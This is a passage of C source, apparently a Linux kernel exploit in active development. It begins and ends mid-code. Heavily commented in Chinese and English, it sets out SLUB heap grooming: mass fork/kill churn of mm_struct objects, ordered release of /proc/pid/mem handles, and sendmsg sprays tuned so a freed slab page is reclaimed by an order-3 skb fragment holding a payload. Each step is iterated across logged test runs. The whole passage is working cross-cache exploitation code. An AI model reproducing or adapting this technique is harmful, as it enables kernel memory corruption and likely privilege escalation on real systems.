  if (!gk_ctx_late) {
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    if (post_ctx.memfds[i] > 0) {
      SYSCHK(close(post_ctx.memfds[i]));
      post_ctx.memfds[i] = -1;
    }
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    if (spray_ctx.memfds[i] > 0) {
      SYSCHK(close(spray_ctx.memfds[i]));
      spray_ctx.memfds[i] = -1;
    }
  }
  }
  /* gK87 观测点 A：所有 ctx 已释放、drain 之前 */
  ckpt_val("slab_after_ctx_close", meminfo_slab_kb());
  ckpt_val("sunreclaim_after_ctx_close", meminfo_sunreclaim_kb());
  /* ===== gK86 关键修复（2026-10-23，A22 结构性根因）=====
   * [缺陷] prepare_ctx 的 close+kill 原本在函数末尾（reclaim 之后），
   *   导致这 1152 个 mm_struct 在整个 sendmsg 重占期间【全部活着】。
   *   它们占满 32 个 slab 页（PREPARE_SLABS=32, 36 obj/页），
   *   使 SLUB unfreeze_partials 的 discard 条件 `!new.inuse` 永不成立，
   *   这些页永不归还 buddy ⇒ sendmsg 的 order-3 frag 永远分配不到 base 页
   *   ⇒ payload 写进别的页，base+0xE80 仍是 mm_struct 字段（非 0）
   *   ⇒ trylock 失败 ⇒ goto retry 无限自旋 ⇒ HWT（A21 ramoops 实测：+0x110）。
   *
   * [修法] 把 prepare_ctx 的释放提前到 reclaim 之前。
   *   顺序变为：prepare_ctx 填满 → kill（页变 empty，可 discard）
   *             → pre/post/spray 释放 → drain 冲刷 → sendmsg 重占。
   *
   * [注意] 必须 close memfd 再 kill：memfd 持有 mm_count，
   *   只 kill 不 close 则 mm 仍不释放（V3 的教训）。
   */
  /* ===== gK89 (A45 plan A): prepare_ctx release timing can be deferred =====
   * [A44] buddy __free_one_page: if higher-order buddy is also free, it uses
   *   list_add_tail (TAIL), source comment: 'less likely to be used soon'.
   *   __rmqueue_smallest uses list_first_entry_or_null => takes from HEAD.
   * [run4] ctx_close->f1 drop 33.5MB = ~1072 order-3 blocks equivalent.
   *   base page freed earliest, then flood pushes it away from HEAD;
   *   128 sendmsg covers only ~12%.
   * [plan A] move prepare_ctx release to AFTER drain, BEFORE reclaim, so the
   *   base page enters buddy LAST => list_add(HEAD) => next sendmsg gets it.
   * [switch] A45_DEFER=1 enables (default 0 = old behaviour, revertible).
   */
  int a45_defer = env_flag("A45_DEFER", 0);
  ckpt_val("a45_defer", (long)a45_defer);
  if (!a45_defer) {
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = 0;
    }
    ckpt_val("a45_release_at", 1);
  } else {
    ckpt_val("a45_release_at", 2);
  }
  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  /* ===== 重建144（gK88）：F1 + F2 修复 payload 不落页（Q7 定案）=====
   * [Q7 根因] SLUB 有三道门，旧代码只保证第①道：
   *   ① inuse == 0
   *   ② slab 不能是 frozen（即不能是当前 active slab / c->page）
   *   ③ node nr_partial >= min_partial(=5，ilog2(896)/2=4 夹到 5)
   * [源码] mm/slub.c:2893-2905 __slab_free：
   *     if ((!new.inuse || !prior) && !was_frozen) {
   *         if (kmem_cache_has_cpu_partial(s) && !prior) new.frozen = 1;
   *         else { n = get_node(...); spin_lock(&n->list_lock); }
   *     }
   *   `!prior` = 这个 slab 释放前【不在任何链表上】= 它就是 active slab。
   *   ⇒ 走 new.frozen=1 → put_cpu_partial，永不进 node partial ⇒ 永不 discard ⇒ 永不回 buddy。
   * [源码] mm/slub.c:2270-2300 put_cpu_partial：只有 pobjects > cpu_partial(=13) 才 flush。
   *
   * [F1 修法] 在 drain 之前先做一轮「激活占位」：
   *   再 clone 一批子进程分配 mm_struct，让 mm_cachep 的 active slab
   *   从 base 页挪到别的页上。这样 base 页释放最后一个对象时 prior != NULL，
   *   会走 node partial 分支而不是被冻进 per-CPU partial。
   * [F2 修法] 保证 node partial 至少 min_partial(=5) 个空 slab 才会 discard。
   *   一个 slab = 32KB = 36 个 mm_struct，5 个 = 180 个。
   *   下面的 DRAIN_SPIN 用「分配 + 释放」两段式，强制产生足量空 slab。
   *
   * 判据（不需要崩溃）：ckpt 里 slab_after_reclaim - slab_after_drain ≈ -2048 kB
   *   仍为 -128 kB ⇒ 页还是没回 buddy。
   */
  {
    int f1_spin = env_int_range("GK88_F1_SPIN", 2, 0, 8);
    int f1_batch = env_int_range("GK88_F1_BATCH", 256, 32, 1024);
    ckpt_val("g88_f1_spin", (long)f1_spin);
    ckpt_val("g88_f1_batch", (long)f1_batch);
    if (f1_spin > 0) {
      long f1_total = 0;
      for (int wave = 0; wave < f1_spin; wave++) {
        pid_t *d = calloc(f1_batch, sizeof(pid_t));
        int n = 0;
        if (d) {
          /* 阶段1：分配，把 active slab 从 base 页挤走 */
          for (int i = 0; i < f1_batch; i++) {
            pid_t c = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
            if (c == 0) {
              SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
              if (getppid() == 1) _exit(0);
              pin_to_core(CORE);
              for (;;) pause();
            }
            if (c > 0) d[n++] = c;
          }
          f1_total += n;
          /* 阶段2：全部释放。此时这些 slab 的 prior 情况由上面分配决定，
           * 空出来后要么进 node partial（可 discard），要么被冻进 cpu_partial。 */
          for (int i = 0; i < n; i++) {
            kill(d[i], SIGKILL);
            waitpid(d[i], NULL, 0);
          }
          free(d);
        }
        sched_yield();
      }
      ckpt_val("g88_f1_total", f1_total);
    }
  }
  /* gK88 观测点 A2：F1 之后（应为释放后再分配前的中间态） */
  ckpt_val("slab_after_f1", meminfo_slab_kb());
  ckpt_val("sunreclaim_after_f1", meminfo_sunreclaim_kb());
  sched_yield();
  /* V3: memfd_leak 已不再打开，无需 close。 */
  /* ===== 重建143（gK39）：★ 关键修复 —— close 之后必须冲刷 slab =====
   * [根因 H1 精确化]
   *   前面 kill_child(pre/post/spray) 与 close(memfd_leak) 只是把 mm_struct
   *   对象标为 free，SLUB 会把它挂在 per-CPU partial list 上，
   *   【不会立刻把整页归还 buddy】。
   *   因此后续 sendmsg 的 order-3 frag 页根本分配不到这一页 -> trylock 读崩。
   *
   * [为何原有 slab_drain 无效]
   *   main.c:977 的 slab_drain() 在 prepare_good_kernel_page 之前调用，
   *   只能清理旧的 partial list；真正的释放发生在 prepare_kernel_page 内部，
   *   那时需要【再 drain 一次】。原代码缺这一步。
   *
   * [做法] 大量 fork 子进程占满 mm_cachep 的新页，再全部杀掉，
   *   迫使 SLUB 回收空 slab 页 -> 归还 buddy -> skb 才能重占 base 页。
   *   次数可配 GK39_DRAIN（默认 3 波 x 256 个）。
   */
  {
    int waves = env_int_range("GK39_DRAIN", 3, 0, 8);
    int batch = env_int_range("GK39_DRAIN_BATCH", 256, 16, 1024);
    ckpt_val("g39_drain_waves", (long)waves);
    for (int wave = 0; wave < waves; wave++) {
      pid_t *d = calloc(batch, sizeof(pid_t));
      int n = 0;
      if (d) {
        for (int i = 0; i < batch; i++) {
          pid_t c = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
          if (c == 0) {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            if (getppid() == 1) _exit(0);
            pin_to_core(CORE);
            for (;;) pause();
          }
          if (c > 0) d[n++] = c;
        }
        for (int i = 0; i < n; i++) {
          kill(d[i], SIGKILL);
          waitpid(d[i], NULL, 0);
        }
        free(d);
      }
      sched_yield();
    }
    ckpt_val("g39_drain_done", 1);
  }
  /* gK87 观测点 B：drain 之后 */
  ckpt_val("slab_after_drain", meminfo_slab_kb());
  ckpt_val("sunreclaim_after_drain", meminfo_sunreclaim_kb());
  /* ===== gK89 (A45 plan A): deferred prepare_ctx release =====
   * Base page must enter buddy LAST so it lands at free_list HEAD
   * (list_add), where __rmqueue_smallest picks it immediately.
   * Must close memfd BEFORE kill: memfd holds mm_count, kill alone
   * does not free the mm (V3 lesson).
   */
  if (a45_defer) {
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      if (prepare_ctx.memfds[i] > 0) {
        SYSCHK(close(prepare_ctx.memfds[i]));
        prepare_ctx.memfds[i] = -1;
      }
      if (prepare_ctx.childs[i] > 0) {
        kill_child(prepare_ctx.childs[i]);
        prepare_ctx.childs[i] = 0;
      }
    }
    ckpt_val("a45_release_done", 1);
    ckpt_val("slab_after_a45_release", meminfo_slab_kb());
    sched_yield();
  }

  /* ===== gK91 (A50): deferred pre_ctx release (the CORRECT ctx) =====
   * Base page = pre_ctx(objs-1) + child_leak(1) filling one order-3 page.
   * Until close(pre_ctx.memfds) runs, mm_count stays 2 (parent holds
   * /proc/pid/mem), so free_mm never runs and that page keeps inuse>=1
   * => SLUB cannot discard it => alloc_pages(order=3) never returns it.
   * Closing here (after drain, right before sendmsg) makes base page the
   * LAST page to enter buddy => list_add(HEAD) => first sendmsg grabs it.
   */
  if (pre_ctx_defer) {
    /* ===== gK101 (A121)：PRE_FORK 排空 —— 顺序修正 =====
     * [A121 关键推导] base 页在 child_leak 释放那一刻就 prior==NULL
     *   ⇒ __slab_free 走 new.frozen=1 ⇒ put_cpu_partial(list_add HEAD)
     *   ⇒ 从此 inuse=0 但永远留在 cpu_partial，永不进 node partial ⇒ 永不 discard。
     *
     * [gK98 post_f1 为何失败] 先 close(pre_ctx) 再 fork：
     *   ___slab_alloc 优先 get_cpu_partial 取页 ⇒ 新 fork 的 mm_struct
     *   直接把 base 页占回去 ⇒ slab 反升 312kB（实测 run1）。
     *
     * [本修法] 必须在 base 页变空【之前】就把子进程 fork 好：
     *   ① 先 fork 足量子进程（此时它们占用别的 slab，base 页仍 inuse>0）
     *   ② 再 close(pre_ctx.memfds) ⇒ base 页 inuse 0 ⇒ frozen 进 c->partial
     *   ③ 最后 kill 这批子进程 ⇒ 它们占的 slab 逐个变空 ⇒ put_cpu_partial
     *      ⇒ pobjects 累加超过 cpu_partial(13) ⇒ unfreeze_partials
     *   ④ unfreeze 时 c->partial 是 LIFO：base 页最早冻结 ⇒ 排在链表尾部
     *      ⇒ 最后处理它时 nr_partial 已 >=5 ⇒ discard_slab(base) ⇒ 回 buddy ★
     * [开关] GK_PRE_FORK=1 启用；GK_PRE_FORK_WAVES/BATCH 可调。
     */
    int pref_on = env_flag("GK_PRE_FORK", 0);
    int pref_waves = env_int_range("GK_PRE_FORK_WAVES", 1, 0, 8);
    int pref_batch = env_int_range("GK_PRE_FORK_BATCH", 700, 32, 2048);
    ckpt_val("g101_pre_fork_on", (long)pref_on);
    if (pref_on) {
      ckpt_val("g101_pre_fork_waves", (long)pref_waves);
      ckpt_val("g101_pre_fork_batch", (long)pref_batch);
      pref_pids = calloc((size_t)pref_batch * pref_waves, sizeof(pid_t));
      if (pref_pids) {
        for (int w = 0; w < pref_waves; w++) {
          for (int i = 0; i < pref_batch; i++) {
            pid_t c = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
            if (c == 0) {
              SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
              if (getppid() == 1) _exit(0);
              pin_to_core(CORE);
              for (;;) pause();
            }
            if (c > 0) pref_pids[pref_n++] = c;
          }
        }
        ckpt_val("g101_pre_fork_total", (long)pref_n);
        ckpt_val("slab_after_pre_fork", meminfo_slab_kb());
        ckpt_val("free_after_pre_fork", meminfo_free_kb());
      }
    }
    /* ===== gK104 (A126)：PRE_CTX_AFTER_KILL —— 让 base 页最后进 buddy =====
     * [A126 根因] 晚 kill 700 线程一次释放 59MB，base 页仅 32KB（占 0.05%），
     *   sendmsg 只取 ~297 个 order-3 块 ⇒ 命中概率 ~16%，实测必然落空。
     * [正确顺序] 先 kill 700（制造 unfreeze 压力，把 base 页从 cpu_partial 挤出来），
     *   最后才 close(pre_ctx.memfds) 让 base 页 inuse→0
     *   ⇒ base 页最后进入 buddy ⇒ __free_one_page 的 list_add(HEAD)
     *   ⇒ sendmsg 第一次分配就拿到它。
     * [开关] GK_PRE_CTX_AFTER_KILL=1 时跳过此处 close，改由 late_kill 之后执行。
     */
    int pre_ctx_after_kill = env_flag("GK_PRE_CTX_AFTER_KILL", 0);
    ckpt_val("g104_pre_ctx_after_kill", (long)pre_ctx_after_kill);
    if (!pre_ctx_after_kill && !gk_ctx_late) {
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      if (pre_ctx.memfds[i] > 0) {
        SYSCHK(close(pre_ctx.memfds[i]));
        pre_ctx.memfds[i] = -1;
      }
    }
    }
    ckpt_val("pre_ctx_release_done", 1);
    ckpt_val("slab_after_pre_ctx_release", meminfo_slab_kb());
    ckpt_val("free_after_pre_ctx_release", meminfo_free_kb());
    sched_yield();
    /* ③ [gK103/A123] kill 延后：见下方 GK_PRE_FORK_LATE 块
     * [根因 slub.c new_slab_objects 铁证]
     *     freelist = get_partial(...);   // ① node partial 优先
     *     if (freelist) return freelist;
     *     page = new_slab(...);          // ② 才向 buddy 要页
     * pre_fork_kill 把 base 页 discard 回 buddy（__free_one_page 用 list_add HEAD，
     * 故 base 页位于 order-3 free_list 队首，是【第一个】被 new_slab 拿走的）。
     * 但 kill 之后还有 post_f1 整段 + prepare_ctx 相关 + 多次 sched_yield，
     * 任何一次 mm_struct 分配都会 new_slab 把 base 页抢走
     * ⇒ sendmsg 的 order-3 frag 永远拿不到它。
     * [修法] GK_PRE_FORK_LATE=1 时把 kill 推迟到 post_f1 之后、紧邻 sendmsg 之前。
     */
    int pref_late = env_flag("GK_PRE_FORK_LATE", 0);
    ckpt_val("g103_pre_fork_late", (long)pref_late);
    if (pref_pids && !pref_late) {
      for (int i = 0; i < pref_n; i++) {
        kill(pref_pids[i], SIGKILL);
        waitpid(pref_pids[i], NULL, 0);
      }
      free(pref_pids);
      pref_pids = NULL;
      ckpt_val("g101_pre_fork_killed", (long)pref_n);
      ckpt_val("slab_after_pre_fork_kill", meminfo_slab_kb());
      ckpt_val("free_after_pre_fork_kill", meminfo_free_kb());
      sched_yield();
    }
    /* ===== A115 修复（2026-10-26）：post-release SLUB 冲击 =====
     * [根因 A113/A114，源码铁证 mm/slub.c:2238]
     *   discard 条件：!new.inuse && n->nr_partial >= s->min_partial
     *   mm_cachep: size=896 ⇒ min_partial=5 (ilog2(896)/2=4 夹到 5)
     *                        ⇒ cpu_partial=13 (256<=size<1024)
     * [缺口] base 页在 :1336 close(pre_ctx.memfds) 才 inuse==0，
     *   但此刻它被 freeze 进 c->partial，需要再撑满 cpu_partial(13) 个部分空 slab
     *   才触发 unfreeze_partials，然后还需 nr_partial>=5 才 discard。
     *   原代码 close 之后只有 1 次 sched_yield ⇒ 两道门都过不了
     *   ⇒ base 页永不归还 buddy ⇒ 2008 次 sendmsg 全部落空（实测）。
     * [修法] close 之后再制造 >=13 个空 order-3 slab。
     *   每 slab = 36 个 mm_struct ⇒ 13*36=468；取 3 波 x 300 = 900 (25 slab) 留余量。
     * [开关] GK_POST_F1=0 可关闭做对照。
     */
    {
      int pf1_waves = env_int_range("GK_POST_F1_WAVES", 3, 0, 8);
      int pf1_batch = env_int_range("GK_POST_F1_BATCH", 300, 32, 1024);
      int pf1_on = env_flag("GK_POST_F1", 1);
      ckpt_val("g115_post_f1_on", (long)pf1_on);
      ckpt_val("g115_post_f1_waves", (long)pf1_waves);
      ckpt_val("g115_post_f1_batch", (long)pf1_batch);
      if (pf1_on) {
        long pf1_total = 0;
        for (int wave = 0; wave < pf1_waves; wave++) {
          pid_t *d = calloc(pf1_batch, sizeof(pid_t));
          int n = 0;
          if (d) {
            for (int i = 0; i < pf1_batch; i++) {
              pid_t c = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
              if (c == 0) {
                SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
                if (getppid() == 1) _exit(0);
                pin_to_core(CORE);
                for (;;) pause();
              }
              if (c > 0) d[n++] = c;
            }
            pf1_total += n;
            for (int i = 0; i < n; i++) {
              kill(d[i], SIGKILL);
              waitpid(d[i], NULL, 0);
            }
            free(d);
          }
          sched_yield();
        }
        ckpt_val("g115_post_f1_total", pf1_total);
        ckpt_val("slab_after_post_f1", meminfo_slab_kb());
      }
    }
  }
  /* ===== gK103 (A123)：延后 kill —— 紧邻 sendmsg 之前 =====
   * [根因] slub.c new_slab_objects 先 get_partial 再 new_slab；
   *   base 页 discard 后位于 order-3 free_list 队首（list_add HEAD），
   *   任何 mm_struct 分配都会把它抢走。
   * [修法] 把 pre_fork 的 kill 推迟到这里（post_f1 之后、sendmsg 之前），
   *   让 base 页 discard 后【立刻】被 sendmsg 的 order-3 frag 拿到。
   * [判据] free_after_late_kill 应 >= free_after_post_f1 + 32KB
   *        （说明 base 页刚回 buddy 且尚未被抢走）
   */
  if (pref_pids && !gk_ctx_late) {
    ckpt_val("free_before_late_kill", meminfo_free_kb());
    for (int i = 0; i < pref_n; i++) {
      kill(pref_pids[i], SIGKILL);
      waitpid(pref_pids[i], NULL, 0);
    }
    free(pref_pids);
    pref_pids = NULL;
    ckpt_val("g103_late_kill_total", (long)pref_n);
    ckpt_val("slab_after_late_kill", meminfo_slab_kb());
    ckpt_val("free_after_late_kill", meminfo_free_kb());
  }
  /* =====★★★ gK106（A136）关键修复：主攻前预热 kmalloc-4096，避免 new_slab 抢走 base 页 =====
   * [★ 根因链 A 级源码闭环]
   *   sendmsg → sock_alloc_send_pskb → alloc_skb_with_frags(skbuff.c:5210)
   *   实测参数：header_len = 3776 (0xEC0)，data_len = 32768 (0x8000)
   *   ┌ 分配1 skbuff.c:5230 alloc_skb(3776) → __alloc_skb:
   *   │   size = SKB_DATA_ALIGN(3776) + SKB_DATA_ALIGN(sizeof(skb_shared_info)=320)
   *   │        = 3776 + 320 = 4096  ⇒ kmalloc_reserve(4096) ⇒ **kmalloc-4096**
   *   │   [A-源码 slub.c:3260] slub_max_order = PAGE_ALLOC_COSTLY_ORDER = 3
   *   │   [A-源码 slub.c:3327-3329] min_objects = 4*(fls(8)+1) = 20
   *   │   [A-计算] calculate_order(4096) = **order 3**（8 页/slab，8 obj/slab）
   *   │   ⇒ kmalloc-4096 与 mm_cachep 共享 free_area[3] 队列！
   *   └ 分配2 skbuff.c:5241 alloc_pages(order=3)  ⇒ skb frag 页（也是 order-3）
   *
   * [为何 base 页必被抢走]
   *   alloc_skb_with_frags 里「分配1 先、分配2 后」。
   *   若 kmalloc-4096 需 new_slab，它【先于】frag 从 free_area[3] 取页，
   *   base 页若在队首就被它抢走做 slab 页（内容变成 kmalloc 对象，非 0）
   *   ⇒ 之后 frag 拿到别的页 ⇒ payload 写进别的页
   *   ⇒ base+0x1D40 内容非 0 ⇒ arch_spin_trylock 失败
   *   ⇒ rtmutex.c [5] goto retry（跳过 ++depth）⇒ 无限自旋 ⇒ HWT
   *
   * [修法] 主攻前先 sendmsg 预热 W 次：
   *   ① 把 kmalloc-4096 的 slab 建好、把 free_area[3] 队列掏短
   *   ② 再 close(pre_ctx) 让 base 页进 buddy（队列已短，更容易靠前）
   *   ③ 主攻阶段只发少量次，kmalloc-4096 有剩空闲对象 ⇒ 不 new_slab ⇒ 只抢 frag
   *
   * [对齐约束] kmalloc-4096 每 slab 8 个对象。要让主攻开始时 c->freelist 非空，
   *   需 W mod 8 != 0。默认 W=2000（2000 mod 8 = 0，故内部 +1 变 2001）。
   *   主攻 M 最多取 (8 - 2001 mod 8) = 7 次仍不触发 new_slab。
   *
   * [sndbuf 上限] 8 sockets × 16MB，每 socket 最多 256 次（256×64KB=16MB）。
   *   预热 W 必须留出主攻空间：W <= 8*256 - M。W=2000 时剩 48 次空间，够用。
   */
  {
    int warmup = env_int_range("GK_WARMUP_SENDS", 0, 0, 4096);
    ckpt_val("gk106_warmup_sends", (long)warmup);
    if (warmup > 0) {
      /* 对齐修正：使 warmup mod 8 != 0，保证主攻开始时有空闲对象 */
      if ((warmup & 7) == 0) warmup += 1;
      ckpt_val("gk106_warmup_eff", (long)warmup);
      ckpt_val("gk106_slab_before_warmup", meminfo_slab_kb());
      ckpt_val("gk106_free_before_warmup", meminfo_free_kb());
      int w_ok = 0;
      long w_bytes = 0;
      int w_done[MAX_RECLAIM_SOCKETS];
      for (int si = 0; si < MAX_RECLAIM_SOCKETS; si++) w_done[si] = 0;
      /* gK115：每 socket 可用次数 = wmem_max/(64KB) = 8388608/65536 = 128；
       * 实测 251 是历史经验值（含 SKB 开销后仍能发的次数）。为兼容起见：
       *   sockets<=8 时沿用 251；sockets>8 时按 2008/sockets 收紧，避免总预算超发。 */
      /* gK115 自纠：原先拟在 sockets>8 时把 cap 收紧到 2008/sockets，
       * 但那会破坏 warmup 的模 8 对齐（必须 = 2001，即 2001 mod 8 = 1）。
       * 例：sockets=24 时 2008/24=83 ⇒ 总 warmup 只能到 1992，1992 mod 8 = 0
       *     ⇒ 主攻第 1 次即触发 kmalloc-4096 new_slab ⇒ 抢走队首（可能就是 base 页）。
       * [保持 251] 每 socket 上限仍 251（硬件真实上限），让 warmup 自然分布：
       *   24 socket 每轮各发 1 次，84 轮 = 2016 > 2001 ⇒ 在第 84 轮中途停，
       *   每 socket 83~84 次，总 2001 ✓（mod 8 = 1，c->freelist 剩 7 个）
       *   主攻剩余 = 251 - 84 = 167 次/socket ⇒ 24*167 ≈ 4008 次覆盖面。
       */
      int w_cap_per_sock = 251;
      ckpt_val("gk115_w_cap_per_sock", (long)w_cap_per_sock);
      ckpt_val("gk115_sockets", (long)reclaim_sockets);
      /* =====★★★ gK107（A138）修正：预热必须精确停在 warmup 次 =====
       * [gK106 实测缺陷] 旧循环 `for (i = 0; i < warmup; i++)` 里每轮对 8 个
       *   socket 各发 1 次 ⇒ warmup=2001 轮 × 8 = 16008 次尝试。
       *   而总容量只有 8 × 251 = 2008 次 ⇒ 预热把配额全吃光，
       *   main 阶段 32 次全部 EAGAIN ⇒ **g38_reclaim=0**（实测）。
       * [修法] 内层也加 `w_ok < warmup` 判停，使总成功次数精确等于 warmup。
       * [配额设计] 总容量 C = sockets × 251 = 2008。
       *   预热 W = 2001（2001 mod 8 = 1），主攻 M = 7 ⇒ 2001+7 = 2008 = C ✓
       *   c->freelist 剩 8-1 = 7 个对象，主攻 7 次正好用完，第 8 次才 new_slab。
       */
      for (int i = 0; i < warmup && w_ok < warmup; i++) {
        int progressed = 0;
        for (int si = 0; si < reclaim_sockets && w_ok < warmup; si++) {
          /* gK115：每 socket 上限 = 总容量/sockets，避免 251 硬编码在 sockets 变化时失真 */
          if (w_done[si] >= w_cap_per_sock) continue;
          errno = 0;
          ssize_t sent = sendmsg(reclaim_sv[si][0], &msg, MSG_DONTWAIT);
          if (sent <= 0) {
            if (w_done[si] == 0)
              pr_warning("GK106: warmup sock%d sendmsg failed at 0 errno=%d\n", si, errno);
            w_done[si] = 251;
            continue;
          }
          w_done[si]++;
          w_ok++;
          w_bytes += (long)sent;
          progressed = 1;
        }
        if (!progressed) break;
      }
      ckpt_val("gk106_warmup_ok", (long)w_ok);
      ckpt_val("gk106_warmup_bytes", w_bytes);
      ckpt_val("gk106_warmup_order3", (long)(w_bytes / (long)ORDER3_SIZE));
      ckpt_val("gk106_slab_after_warmup", meminfo_slab_kb());
      ckpt_val("gk106_free_after_warmup", meminfo_free_kb());
      pr_info("GK106: warmup ok=%d/%d bytes=%ld (%.2f MiB) order3~%ld\n",
              w_ok, warmup, w_bytes, (double)w_bytes / (1024.0 * 1024.0),
              (long)(w_bytes / (long)ORDER3_SIZE));
    }
  }
  /* =====★★★ gK108 (A150)：late ctx release —— 本方案核心 =====
   * [时序] 到这里时：所有 fork churn 已完成（F1/drain/pre_fork/post_f1 都在上面），
   *   warmup 2001 次 sendmsg 也已完成。base 页因 leak_memfd 钉住而全程 inuse=36（full），
   *   full slab 不在任何 partial 链表 ⇒ 所有 churn 都抢不走它。
   *
   * [本段做 4 件事]
   *   ① close(leak_memfd)：base 页 36->35，prior==NULL ⇒ 首次冻结 ⇒ put_cpu_partial
   *      pobjects += 36-35 = 1，base 页成为 c->partial 头（page->next = oldpage）。
   *   ② close(post_ctx / pre_ctx / spray_ctx)：base 页已 was_frozen=1
   *      ⇒ __slab_free 直接 return，不累加 pobjects、不 discard。base 页 inuse 到 0。
   *      （但此时它仍在 c->partial 里，等待 unfreeze_partials 处理）
   *   ③ kill 700（pre_fork 的进程，纯 free 无 alloc）：
   *      每个满页首次释放都是一次冻结事件 ⇒ pobjects += 1
   *      累计 14 次时 oldpage->pobjects=14 > cpu_partial=13 ⇒ 触发 unfreeze_partials
   *   ④ unfreeze_partials 从头到尾遍历 c->partial：
   *      头部的 churn 页 inuse=35 ⇒ add_partial（nr_partial++）
   *      **base 页在尾部最后处理**，此时 nr_partial 已 >= min_partial(5) 且 inuse==0
   *      ⇒ discard_slab(base) ⇒ free_slab ⇒ __free_one_page ⇒ list_add(HEAD) ⇒ 队首
   *
   * [为何 base 页在尾部] put_cpu_partial: `page->next = oldpage` ⇒ LIFO，
   *   最早冻结的排在链表尾；unfreeze_partials 从 c->partial 头开始，尾部最后处理。
   *
   * [判据] slab_after_ctx_late_close 相对 slab_before_ctx_late_close 应 -64KB 或更多
   *        （base 页 + pre_ctx 另一页都应被 discard）。
   *        slab_after_late_kill2 应再降（churn 页被 discard）。
   */
  if (gk_ctx_late) {
    ckpt_val("slab_before_ctx_late_close", meminfo_slab_kb());
    ckpt_val("free_before_ctx_late_close", meminfo_free_kb());
    /* ===== gK112（静态定案 2026-10-27）：SLAB_EMPTY 直通破法 =====
     * [A-源码 slub.c:2938] __slab_free 的 discard 唯一路径：
     *     if (!new.inuse && n->nr_partial >= s->min_partial) goto slab_empty;
     *   slab_empty => discard_slab => __free_one_page(list_add 队首) => 下一次 order-3 即拿到。
     * [旧逻辑失败原因]
     *   ① base 页是满页 => prior==NULL => 首次释放即 new.frozen=1 => 进 c->partial（不 discard）
     *   ② base 页处于 c->partial 链尾（最早冻结）=> unfreeze 时最后遍历、最后 push 到
     *      discard_page **栈**（LIFO）=> **最先 discard** => 最先入 free_area[3] 队首
     *   ③ 随后 460~545 个 churn 页 list_add 队首，把 base 页压到第 460 位
     *   ④ 主攻 g38_reclaim 只有 7 次 => 只拿到队首 7 个 => 命中率 7/500 = 1.4%
     *   ❗旧注释“尾部最后处理 => 队首”把 LIFO 栈推反了。
     * [本破法] 让 base 页走 slab_empty 直通，跳过 discard_page 栈：
     *   ① 只关 p1 个 post_ctx memfd => base 36 -> 36-p1，首次冻结（base 在 c->partial）
     *   ② kill 700 => >=14 次新冻结 => pobjects > cpu_partial(13) => unfreeze_partials
     *      base inuse=36-p1 != 0 => add_partial(n, base) => base 进 node partial（prior!=NULL）
     *   ③ 关闭剩余全部 memfd => base inuse -> 0，page!=c->page 且 prior!=NULL
     *      => 走 __slab_free 慢路径 => !new.inuse && nr_partial>=5 => slab_empty
     *      => 立即 discard，list_add 队首 => 主攻第 1 次就拿到 base 页
     * [几何] base 页 36 对象 = pre_ctx 末 8 + child_leak 1 + post_ctx 前 27
     *   故 post_ctx[0..p1-1] 必落在 base 页上。
     */
    int se_mode = env_flag("GK_SLAB_EMPTY", 0);
    ckpt_val("gk_se_mode", (long)se_mode);

    if (se_mode) {
      int se_p1 = env_int_range("GK_SE_P1", 5, 1, 32);
      ckpt_val("gk_se_p1", (long)se_p1);

      /* ---- (1) 只关 p1 个：base 36 -> 36-p1，首次冻结 ---- */
      int p1_done = 0;
      for (size_t i = 0; i < post_ctx.mm_cnt && p1_done < se_p1; i++) {
        if (post_ctx.memfds[i] > 0) {
          SYSCHK(close(post_ctx.memfds[i]));
          post_ctx.memfds[i] = -1;
          p1_done++;
        }
      }
      ckpt_val("gk_se_p1_closed", (long)p1_done);
      ckpt_val("gk_se_after_p1", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_p1", meminfo_free_kb());

      /* ---- (2) kill 700：触发 unfreeze，把 base 页送进 node partial ---- */
      if (pref_pids) {
        for (int i = 0; i < pref_n; i++) {
          kill(pref_pids[i], SIGKILL);
          waitpid(pref_pids[i], NULL, 0);
        }
        ckpt_val("gk_se_kill700_total", (long)pref_n);
        free(pref_pids);
        pref_pids = NULL;
      } else {
        ckpt_val("gk_se_kill700_total", 0);
      }
      ckpt_val("gk_se_after_kill700", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_kill700", meminfo_free_kb());
      sched_yield();
      sched_yield();

      /* ---- (3) V3：按【修正后的几何】排序，base 页最后归零 ----
       * [几何 A 级重算，已验证]
       *   mm_objs_per_slab = 36
       *   prepare_ctx 1728 = 48 整页；spray_ctx 216 = 6 整页；两者和 1944 恰好对齐页界
       *   pre_ctx 35 个 -> 占新页 slot 0..34（剩 1 空位）
       *   child_leak 1 个 -> 占最后 1 slot => **base 页 inuse = 36（满）**
       *   post_ctx 36 个 -> 全在下一页，对 base 页零影响
       *   ⇒ base 页 = pre_ctx[0..34] + child_leak，是**纯 pre_ctx 页**
       *   （旧注释「pre_ctx 末8 + child_leak + post_ctx 前27」是错的）
       *
       * [生命周期，mm_count 为准]
       *   pre_ctx[i]: clone(users=1,count=1) -> open_memfd(count=2) -> kill(users=0,__mmput,count=1)
       *               -> close(memfd)(count=0) => free_mm ✓
       *   child_leak: clone -> open_memfd(count=2) -> exit(users=0,count=1)
       *               -> close(memfd)(count=0) => free_mm ✓
       *
       * [顺序设计]
       *   (3a) post_ctx 全关 + spray 全关   -> 它们的页先 discard，压在队底
       *        （此时 base 页仍 inuse=36，因为它只由 pre_ctx + child_leak 组成）
